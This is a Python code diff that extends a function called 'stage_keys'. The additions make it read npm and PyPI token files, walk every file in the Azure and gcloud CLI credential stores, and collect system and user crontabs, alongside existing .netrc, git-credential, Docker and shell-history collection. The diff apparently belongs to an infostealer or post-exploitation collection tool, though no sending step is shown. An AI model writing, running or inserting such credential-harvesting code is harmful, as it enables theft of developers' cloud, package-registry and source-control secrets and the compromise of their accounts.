@@ -313,12 +313,41 @@ def stage_keys(parts, home):
         ("netrc", ".netrc"),
         ("git-credentials", ".git-credentials"),
         ("docker-config", ".docker/config.json"),
+        ("npmrc", ".npmrc"),
+        ("pypirc", ".pypirc"),
     ]
     for label, rel in files:
         data = read_file(os.path.join(home, rel))
         if data is not None:
             add(parts, "linux:file/%s" % label, data, {"path": rel})
             n += 1
+
+    # cloud CLI token stores
+    for label, sub in (("azure", ".azure"), ("gcloud", ".config/gcloud")):
+        d = os.path.join(home, sub)
+        if not os.path.isdir(d):
+            continue
+        for root, dirs, fs in os.walk(d):
+            for f in fs:
+                p = os.path.join(root, f)
+                data = read_file(p, limit=1024 * 1024)
+                if data is not None:
+                    add(parts, "linux:cloud/%s/%s" % (label, f), data, {"path": p})
+                    n += 1
+
+    # cron (root-readable usually)
+    for label, p in (("crontab-system", "/etc/crontab"),):
+        data = read_file(p)
+        if data is not None:
+            add(parts, "linux:file/%s" % label, data, {"path": p})
+            n += 1
+    for root, dirs, fs in os.walk("/var/spool/cron"):
+        for f in fs:
+            p = os.path.join(root, f)
+            data = read_file(p)
+            if data is not None:
+                add(parts, "linux:file/crontab-%s" % f, data, {"path": p})
+                n += 1
 
     # shell history tails
     for label, rel in (("bash-history", ".bash_history"),
